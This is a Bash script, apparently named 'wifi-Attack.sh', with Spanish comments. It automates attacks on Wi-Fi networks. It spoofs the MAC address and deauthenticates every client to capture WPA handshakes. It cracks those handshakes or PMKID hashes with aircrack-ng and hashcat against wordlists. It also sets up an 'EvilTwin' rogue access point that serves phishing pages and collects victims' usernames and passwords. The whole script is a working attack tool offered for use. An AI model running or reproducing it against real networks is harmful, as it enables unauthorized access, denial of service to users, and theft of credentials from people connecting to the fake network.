#!/bin/bash

#Colors
red="\e[1;31m"
green="\e[1;32m"
yellow="\e[1;33m"
blue="\e[1;34m"
purple="\e[1;35m"
cyan="\e[1;36m"
white="\e[1;37m"
end="\e[0m"

#No interactive
export DEBIAN_FRONTEND=noninteractive

#Exit
trap ctrl_c INT

function ctrl_c(){
	clear; echo -e "${red}[!]Saliendo!.${end}"
	echo -e "${purple}[!] Espere a que finalice...${end}"
	rm -f handshake_pcap/captura* 2>/dev/null
	rm -f scripts/*.conf 2>/dev/null
	if [[ $(find . -name "usernames.txt" | wc -l ) -ne 0 ]]; then
		file=$(find . -name usernames.txt)
		cat $file >> credenciales/credenciales_$(echo ${file} | awk -F '/' '{print $3}')
		find websites/ -name "*.txt" |xargs rm -f 2>/dev/null
		echo -e "${green}[]${end}${yellow} Crendenciales guardas en la carpeta credenciales${end}"
	fi
	stop_attack
	interface_option=0; name_interface; tput cnorm; exit 1
}
# Panel de Ayuda
function help_panel(){
	echo -e "${blue}[] Modo de uso [root]: ./wifi-Attack.sh -m <attack mode> -i <interface>${end}"

	echo -e "${purple}\tm)${end}${yellow} Modo de ataque ${end}"
	echo -e "${cyan}\t\tHandshake${end}"
	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}Hanshake${end} ${purple}-i${end} ${cyan}wlan0${end}"
	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}Hanshake${end} ${purple}-i${end} ${cyan}wlan0${end} ${purple}-w${end} ${cyan}wordlist${end}"

	echo -e "${cyan}\t\tPKMID${end}"
	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}PKMID${end} ${purple}-i${end} ${cyan}wlan0${end}"
	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}PKMID${end} ${purple}-i${end} ${cyan}wlan0${end} ${purple}-w${end} ${cyan}wordlist${end}"

	echo -e "${cyan}\t\tEvilTwin${end}"
	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}EvilTwin${end} ${purple}-i${end} ${cyan}wlan0${end}"

	echo -e "${purple}\ti)${end}${yellow} Interfaz de red${end}"
	echo -e "${purple}\tw)${end}${yellow} Diccionario (opcional)${end}"

	echo -e "\n${white}[] By: ErickBuster ${end}"
}
# Dependencias
function dependencies(){
	bash scripts/dependencies.sh
}
# Renombramiento de la interfaz de red
function name_interface(){
	if [[ $interface != $interface_set && $interface_option -eq 1 ]]; then
		new_interface=$interface_set
		old_interface=$interface
		export old_interface
		export new_interface
		python settings/rename-interface.py 2>/dev/null

	elif [[ $interface_option -eq 0 ]]; then
		ifconfig ${interface_set}mon >/dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			new_interface=$interface
			old_interface=${interface_set}mon

			export new_interface
			export old_interface
			python settings/rename-interface.py 2>/dev/null
			/usr/sbin/ifconfig $interface down && macchanger -p $interface > /dev/null 2>&1
			/usr/sbin/ifconfig $interface up
			/usr/sbin/ifconfig $interface 0.0.0.0
			dnsmasq_back_pid=$(netstat -anlp | grep -w LISTEN | grep dnsmasq | awk 'NF{print $NF}' | awk -F '/' '{print $1}' | head -1)
			kill $dnsmas_back_pid 2>/dev/null
		else
			new_interface=$interface
			old_interface=${interface_set}
			export new_interface
			export old_interface
			python settings/rename-interface.py 2>/dev/null
			/usr/sbin/ifconfig $interface down && macchanger -p $interface > /dev/null 2>&1
			/usr/sbin/ifconfig $interface up
		fi
	fi
}
# Configurando interfaz modo monitor
function attack_ini(){
	dependencies # Comprobando dependencias
	# Inicialiando la tarjeta de red
	echo -e "${blue}[]${end}${yellow} Modo de ataque:\t$attack ${end}"
	echo -e "${blue}[]${end}${yellow} Interfaz:\t\t$interface_set ${end}"
	sleep 2; clear
	echo -e "${blue}[]${end}${cyan} Configurando la tarjeta de red...${end}"
	sleep 2
	# Configurando la tarjeta en modo monitor
#	airmon-ng check kill > /dev/null 2>&1 #Descomentar en el caso de que te conectes por eth0
	airmon-ng start $interface_set > /dev/null 2>&1
	# Cambiando la direccion mac
	/usr/sbin/ifconfig ${interface_set}mon down && macchanger -a ${interface_set}mon > /dev/null 2>&1
	/usr/sbin/ifconfig ${interface_set}mon up
	echo -e "${blue}[]${end} ${white}Nueva mac asignada: $(macchanger -s ${interface_set}mon | grep -i 'current' | xargs | awk '{print $3}')${end}\n"
	sleep 1;
}
# Ataque Handshake
function attack_handshake(){
	#Iniciando ataque
	echo -e "${blue}[]${end}${cyan} Comenzando ataque handshake...${end}"
	mkdir handshake_pcap 2>/dev/null

	xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Airodump" -geometry 100x30 -e "airodump-ng ${interface_set}mon" &
	airodump_xterm_pid=$!; tput cnorm
	echo -ne "${blue}[]${end}${yellow} Nombre del punto de acceso (essid): ${end}" && read essid_ap
	echo -ne "${blue}[]${end}${yellow} Canal del punto de acceso ($essid_ap): ${end}" && read channel_ap
	tput civis
	kill -9 $airodump_xterm_pid > /dev/null 2>&1
	wait $airodump_xterm_pid 2> /dev/null

	echo -ne "${blue}[]${end}${yellow} Obteniendo una handshake...${end}"
	xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Handshake" -geometry 100x30 -e "airodump-ng -c $channel_ap --essid $essid_ap -w handshake_pcap/captura ${interface_set}mon" &
	airodump_scan_xterm_pid=$!
	sleep 4
	xterm -hold -bg \#000000 -fg \#B40000 -T "Desautenticacion" -geometry 90x30 -e "aireplay-ng -0 15 -c FF:FF:FF:FF:FF:FF -e $essid_ap ${interface_set}mon" &
	aireplay_attack_pid=$!
	sleep 15; kill -9 $aireplay_attack_pid; wait $aireplay_attack_pid 2>/dev/null
	sleep 8; kill -9 $airodump_scan_xterm_pid; wait $airodump_scan_xterm_pid 2> /dev/null
	echo -e "${white}\tYEIH $essid_ap HANDSHAKE!.${end}"
	if [[ $dictionary != "" ]]; then
		echo -e "${white}[]${end}${green} Comenzando ataque de fuerza bruta!...${end}"
		xterm -hold -bg \#000000 -fg \#FFFFFF -T "Fuerza bruta" -e "aircrack-ng -w $dictionary handshake_pcap/captura-01.cap " &
	else
		option=""
		tput cnorm
		while [[ option -ne 1 && option -ne 2 && option -ne 3 ]]; do
			echo -e "\n${blue}[]${end}${yellow} Elija la opcion deseada ${end}"
			echo -e "${blue}[1]${end}${cyan} Ataque de fuerza bruta con diccionario rockyou..${end}"
			echo -e "${blue}[2]${end}${cyan} Ataque de fuerza bruta con diccionario propio..${end}"
			echo -e "${blue}[3]${end}${cyan} Creando una evilTwin...${end}"
			echo -ne "${red} >>>: ${end}" && read option
			clear
		done
		tput civis

		if [[ option -eq 1 ]]; then
			xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_pcap/captura-01.cap " &
		elif [[ option -eq 2 ]]; then
			tput cnorm
			echo -ne "\n${blue}[]${end}${yellow} Ingrese la ruta de su diccionario: ${end}" && read dir_dicc
			xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -e "aircrack-ng -w $dir_dicc $ handshake_pcap/captura-01.cap " &
			tput civis
		elif [[ option -eq 3 ]]; then
			attack_eviltwin $essid_ap $channel_ap
			ctrl_c
		else
			echo -e "${red}[] Parametro incorrecto!...${end}"
		fi
	fi
}
function attack_pkmid(){
	echo -e "${blue}[]${end}${cyan} Comenzando ataque PKMID...${end}"
	mkdir handshake_pcap 2>/dev/null
	sleep 2
	timeout 60 bash -c "hcxdumptool -i ${interface_set}mon --enable_status=1 -o captura_pkmid"
	echo -e "${blue}[]${end}${yellow} Obteniendo hashes de la captura pcap...${end}"
	hcxpcaptool -z handshake_pcap/hashes_pkmid captura_pkmid 2>/dev/null
	rm captura_pkmid 2>/dev/null
	test -f handshake_pcap/hashes_pkmid
	if [[ $? -eq 0 ]]; then
		if [[ $dictionary != "" ]]; then
	                echo -e "${white}[]${end}${green} Comenzando ataque de fuerza bruta!...${end}"
	                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pkmid $dictionary" &
	        else
	                option=""
	                tput cnorm
	                while [[ option -ne 1 && option -ne 2 && option -ne 3 ]]; do
	                        echo -e "\n${blue}[]${end}${yellow} Elija la opcion deseada ${end}"
	                        echo -e "${blue}[1]${end}${cyan} Ataque de fuerza bruta con diccionario rockyou..${end}"
	                        echo -e "${blue}[2]${end}${cyan} Ataque de fuerza bruta con diccionario propio..${end}"
	                        echo -ne "${red} >>>: ${end}" && read option
	                        clear
	                done
	                tput civis

	                if [[ option -eq 1 ]]; then
		                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pkmid $dictionary /usr/share/wordlists/rockyou.txt" &
	                elif [[ option -eq 2 ]]; then
        	                tput cnorm
	                        echo -ne "\n${blue}[]${end}${yellow} Ingrese la ruta de su diccionario: ${end}" && read dir_dicc
		                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pkmid $dir_dicc" &
	                        tput civis
	                else
	                        echo -e "${red}[] Parametro incorrecto!...${end}"
	                fi
	        fi
	else
		echo -e "${red}[] Ningun hash obtenido!...${end}"
	fi
}
# Ataque EvilTwin
function attack_eviltwin(){
	echo -e "${blue}[]${end}${cyan} Comenzando ataque EvilTwin...${end}"
	mkdir credenciales 2>/dev/null
	tput cnorm

	if [[ $attack == "Handshake" ]]; then
		essid_ap_fake=$1
		channel_ap_fake=$2
		rm -f credenciales/PASS_$essid_ap_fake 2>/dev/null
	else
		echo -ne "${blue}[]${end}${yellow} Ingrese el nombre de la red (Wifi-Free): ${end}" && read essid_ap_fake
		echo -ne "${blue}[]${end}${yellow} Ingrese el canal de ${essid_ap_fake} [1-12]: ${end}" && read channel_ap_fake
	fi

 	echo -e "${blue}[]${end}${yellow} Selecciona tu puente de red(eth0)${end}"
	all_interface=$(/usr/sbin/ifconfig | awk '{print $1}' | grep ':' | tr -d ':' | grep -v -E "lo|${interface_set}mon" | xargs)
	echo -ne "${blue}[]${end}${purple} ${all_interface}: ${end}" && read out_interface
	tput civis

	echo -ne "\n${blue}[]${end}${yellow} Configurando dnsmasq${end}"
	echo "interface=${interface_set}mon" > scripts/dnsmasq.conf
	echo "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h" >> scripts/dnsmasq.conf
	echo "dhcp-option=3,10.0.0.1" >> scripts/dnsmasq.conf
	echo "dhcp-option=6,10.0.0.1" >> scripts/dnsmasq.conf
	echo "server=8.8.8.8" >> scripts/dnsmasq.conf
	echo "log-queries" >> scripts/dnsmasq.conf
	echo "log-dhcp" >> scripts/dnsmasq.conf
	echo "listen-address=127.0.0.1" >> scripts/dnsmasq.conf
	sleep 1; echo -e "${green}\t[] Terminado!${end}"; sleep 1

	echo -ne "${blue}[]${end}${yellow} Configurando hostapd${end}"
	echo "interface=${interface_set}mon" > scripts/hostapd.conf
	echo "driver=nl80211" >> scripts/hostapd.conf
	echo "ssid=${essid_ap_fake}" >> scripts/hostapd.conf
	echo "channel=${channel_ap_fake}" >> scripts/hostapd.conf
	echo "hw_mode=g" >> scripts/hostapd.conf
	echo "macaddr_acl=0" >> scripts/hostapd.conf
	echo "ignore_broadcast_ssid=0" >> scripts/hostapd.conf
	sleep 1; echo -e "${green}\t[] Terminado!${end}"; sleep 1

	echo -ne "${blue}[]${end}${yellow} Configurando iptables${end}"
	chmod +x scripts/iptablesRules.sh
	export out_interface; export interface_set
	bash scripts/iptablesRules.sh; sleep 1
	echo -e "${green}\t[] Terminado!${end}"; sleep 1

	echo -ne "${blue}[]${end}${yellow} Configurando el enrutamiento${end}"
	ifconfig ${interface_set}mon down
	ifconfig ${interface_set}mon up 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	sleep 1; echo -e "${green}[] Terminado!${end}"; sleep 1

	if [[ $attack == "Handshake" ]]; then
		web_fake="Rogue_AP"
	else
		plantillas=$(ls websites/ ); tput cnorm
		echo -e "${blue}[]${end}${yellow} Seleccione su plantilla${end}"
		echo -e "${purple}${plantillas[@]}${end}: "
		echo -ne "${red} >>>: ${end}" && read web_fake
		tput civis
	fi
	sleep 2; clear

	echo -e "${white}[]${end}${green} Montando punto de acceso falso!...${end}"
	xterm -hold -bg \#784212 -fg \#FFFFFF -T "hostapd" -geometry 85x30 -e "hostapd scripts/hostapd.conf" &
	hostapd_pid=$!; sleep 2
	xterm -hold -bg \#424949 -fg \#FFFFFF -T "dnsmasq" -geometry 80x30 -e "dnsmasq -C scripts/dnsmasq.conf -d" &
	dnsmasq_pid=$!; sleep 2
	pushd websites/${web_fake} > /dev/null 2>&1
	xterm -hold -bg \#2C2C2C  -fg \#FFFFFF -T "PHP" -geometry 95x30 -e "php -S $(/usr/sbin/ifconfig | grep ${out_interface} -A 1 | grep inet | awk '{print $2}'):80" &
	php_pid=$!; popd >/dev/null 2>&1
	clear; chmod +x scripts/hosts.sh

	number_hosts=0

	while [ true ]; do
		echo -e "${white}[] Esperando credenciales... [ Ctrl + C para salir!.]${end}"
		echo -e "${blue}[#]${end}${cyan} Victimas conectadas a la red: ${end}${red}${number_hosts}${end}"
		find websites/${web_fake}/usernames.txt >/dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			while IFS= read -r line; do
				echo -ne "${blue}[]${end}${yellow} username:${end}${white} $(echo $line | awk '{print $2}')${end}"
				echo -e "${yellow} password:${end}${white} $(echo $line | awk '{print $4}')${end}"
				if [[ $attack == "Handshake" ]]; then
					echo $line | awk '{print $2}' >> credenciales/PASS_$essid_ap_fake
					echo $line | awk '{print $4}' >> credenciales/PASS_$essid_ap_fake
				fi
			done < websites/${web_fake}/usernames.txt

			if [[ $attack == "Handshake" && -f credenciales/PASS_$essid_ap_fake ]]; then
				aircrack-ng -w credenciales/PASS_$essid_ap_fake handshake_pcap/captura-01.cap | grep "KEY FOUND"
				if [[ $? -eq 0 ]]; then
					aircrack-ng -w credenciales/PASS_$essid_ap_fake handshake_pcap/captura-01.cap | grep "KEY FOUND" | awk '{print $4}' | sort -u > credenciales/PASS_FOUND_$essid_ap_fake
					echo -e "\n${white}[] Enhorabuena!!!. Password descifrada [ $(cat credenciales/PASS_FOUND_$essid_ap_fake) ] ${end}"
					kill -9 $hostapd_pid; wait $hostapd_pid 2>/dev/null
					kill -9 $dnsmasq_pid; wait $dnsmasq_pid 2>/dev/null
					kill -9 $php_pid; wait $php_pid 2>/dev/null
					rm -f credenciales/PASS_$essid_ap_fake
					sleep 5; break
				else
					rm -f credenciales/PASS_$essid_ap_fake
				fi
			fi
		fi
		number_hosts=$(bash scripts/hosts.sh | wc -l)
		sleep 2; clear
	done
}
# Parando ataque
function stop_attack(){
	echo -e "${white}\n[] Restableciendo configuracion. Espere porfavor...${end}"
	airmon-ng stop ${interface_set}mon > /dev/null 2>&1
	/usr/sbin/ifconfig $interface up 2>/dev/null
	/etc/init.d/networking restart > /dev/null 2>&1
	/usr/bin/systemctl restart network-online.target

	dnsmasq_back_pid=$(netstat -anlp | grep -w LISTEN | grep dnsmasq | awk 'NF{print $NF}' | awk -F '/' '{print $1}' | head -1)
	kill $dnsmasq_back_pid 2>/dev/null
	echo 0 > /proc/sys/net/ipv4/ip_forward
}
#Main function
if [ $(id -u) == "0" ]; then
	#Options
	while getopts ":m:i:w:h" arg; do
		case $arg in
			m)
				attack=$OPTARG;;
			i)
				interface=$OPTARG;;
			w)
				dictionary=$OPTARG;;
			h)
				help_panel;;
			?)
				echo -e "${red}[] Opcion invalida..."
		esac
	done
	if [[ ${#} -ne "4" && ${#} -ne "6" ]]; then
		help_panel
	else
		interface_set=$(cat settings/interface_setting)
		# Renombrando interfaz de red
		interface_option=1; name_interface; sleep 1
		tput civis # Ocultando cursor

		# Renombrando la interfaz de red
		if [[ $attack == "Handshake" && $interface != "" ]]; then
			rm handshake_pcap/captura* 2>/dev/null

			# Comenzando ataque
			attack_ini # Configurando tarjeta de red
			attack_handshake # Realizando ataque a la red

			# Parando la tarjeta en modo
			stop_attack
		elif [[ $attack == "PKMID" && $interface != "" ]]; then
			rm handshake_pcap/hashes_pkmid 2>/dev/null

			#comenzando ataque
			attack_ini # Configurando tarjeta de red
			attack_pkmid

			# Parando la tarjeta en modo
			stop_attack

		elif [[ $attack == "EvilTwin" && $interface != "" ]];then
			# Comenzando ataque
			attack_ini # Configurando tarjeta de red
			attack_eviltwin

			# Terminando ataque
			rm -f scripts/*.conf 2>/dev/null; find . -name "*.txt" | xargs rm -f
			stop_attack
			interface_option=0; name_interface
		else
			help_panel
		fi

		tput cnorm # Recuperando cursor
	fi
else
	echo -e "${white}[!] Debes ser root para ejecutar el programa${end}"
	help_panel
fi
